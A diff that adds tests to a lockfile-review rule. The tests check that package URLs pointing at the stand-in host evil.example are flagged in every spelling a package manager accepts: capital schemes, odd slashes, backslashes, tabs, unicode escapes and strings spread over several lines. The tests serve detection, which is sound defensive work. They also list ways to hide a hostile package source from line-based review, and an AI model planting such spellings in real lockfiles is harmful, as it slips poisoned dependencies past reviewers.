@@ -3178,6 +3178,71 @@ class TestTheShippedRules:
         ):
             assert fetched(url) == [outside("uv.lock", origin)], url
 
+    def test_an_address_in_any_spelling_a_package_manager_reads_is_a_source(self) -> None:
+        """Read by review, and reproduced with uv and a server of the probe's own: a URL's parser takes a scheme in
+        capitals, one slash, none or three, backslashes, and a tab inside the word, and uv installed from each, where
+        the rule read `https://` alone: a branch pointed a package at a host of its own on a line the rule passed over.
+        Each spelling is a source now, and only the one a package manager writes is its registry's."""
+        from adk_review.judge.rule_helpers import try_rule
+        from adk_review.judge.rules.lockfile_sources import LockfileSources
+
+        def named(line: str, lock: str = "uv.lock") -> list[str]:
+            return [hit.title or "" for hit in try_rule(LockfileSources(), {lock: line + "\n"})]
+
+        outside = "{} fetches from {}, outside its public registry".format
+        tail = "evil.example/pad-1.0-py3-none-any.whl"
+        for written, origin in (
+            ("HTTPS://" + tail, "HTTPS://evil.example"),
+            ("Https://" + tail, "Https://evil.example"),
+            ("https:/" + tail, "https://evil.example"),
+            ("https:" + tail, "https://evil.example"),
+            ("https:///" + tail, "https://evil.example"),
+            ("https:\\\\\\\\" + tail, "https://evil.example"),  # as TOML writes two backslashes
+            ("https:/\\\\" + tail, "https://evil.example"),
+            ("ht\ttps://" + tail, "https://evil.example"),  # a tab, which a URL's parser drops
+            ("registry+HTTPS://" + tail, "registry+HTTPS://evil.example"),
+            ("https://pypi.org\t.evil.example/simple/pad.whl", "https://pypi.org.evil.example"),
+        ):
+            assert outside("uv.lock", origin) in named(f'wheels = [{{ url = "{written}" }}]'), written
+        escaped = '"resolved": "https:\\/\\/evil.example\\/pad\\/-\\/pad-1.0.0.tgz",'  # as JSON may write a slash
+        assert outside("web/package-lock.json", "https://evil.example") in named(escaped, "web/package-lock.json")
+        capitals = 'source = { registry = "HTTPS://pypi.org/simple" }'
+        assert named(capitals) == [outside("uv.lock", "HTTPS://pypi.org")], "its registry, as no manager writes it"
+        assert named('source = { registry = "https://pypi.org/simple" }') == [], "and as one does"
+        assert named(":git: https://github.com/CocoaPods/Specs.git", "ios/Podfile.lock") == [], "a key is no scheme"
+
+    def test_a_lockfiles_string_written_as_no_package_manager_writes_one_is_named(self) -> None:
+        """Reproduced with uv the same way: an address written with an escape, `\\u0068ttps`, or over two lines of one
+        string, was installed from, and no reader of single lines sees it. Measured over 17 projects' lockfiles, of
+        every kind the rule reads, 63,750 lines: none holds an escape but a quote's, a string over lines, or a line
+        that ends in a backslash. So each is named, once a file, for a person to read what it hides."""
+        from adk_review.judge.rule_helpers import try_rule
+        from adk_review.judge.rules.lockfile_sources import LockfileSources
+
+        def named(text: str, lock: str = "uv.lock") -> list[str]:
+            return [hit.title or "" for hit in try_rule(LockfileSources(), {lock: text + "\n"})]
+
+        hidden = "{} writes a string as no package manager does, with an escape or over several lines".format
+        for text in (
+            'wheels = [{ url = "\\u0068ttps://evil.example/pad.whl" }]',
+            'wheels = [{ url = "https\\u003a//evil.example/pad.whl" }]',
+            'wheels = [{ url = "ht\\ttps://evil.example/pad.whl" }]',
+            'wheels = [{ url = """ht',
+            "wheels = [{ url = '''ht",
+            'wheels = [{ url = """ht\\',
+        ):
+            assert hidden("uv.lock") in named(text), text
+        unicode_escape = '"resolved": "\\u0068ttps://evil.example/pad/-/pad-1.0.0.tgz",'
+        assert hidden("web/package-lock.json") in named(unicode_escape, "web/package-lock.json")
+        twice = 'a = "\\u0068ttps://evil.example/a"\nb = "\\u0068ttps://evil.example/b"'
+        assert named(twice).count(hidden("uv.lock")) == 1, "once a file"
+        for text in (
+            'marker = "python_version < \\"3.11\\""',  # as Poetry and PDM write a marker
+            'source = { directory = "..\\\\lib" }',  # a path as Windows writes one, each backslash doubled
+            'name = "pad"',
+        ):
+            assert named(text) == [], text
+
     def test_a_dart_elixir_bun_or_cocoapods_lockfile_is_read_as_its_package_manager_writes_it(self) -> None:
         """Lines from real lockfiles: harmonoid's pubspec.lock, elixir-ls's mix.lock, wow.export's and ens-contracts'
         bun.lock, Hammerspoon's and ShadowsocksX-NG's Podfile.lock. A package from the registry passes as each package
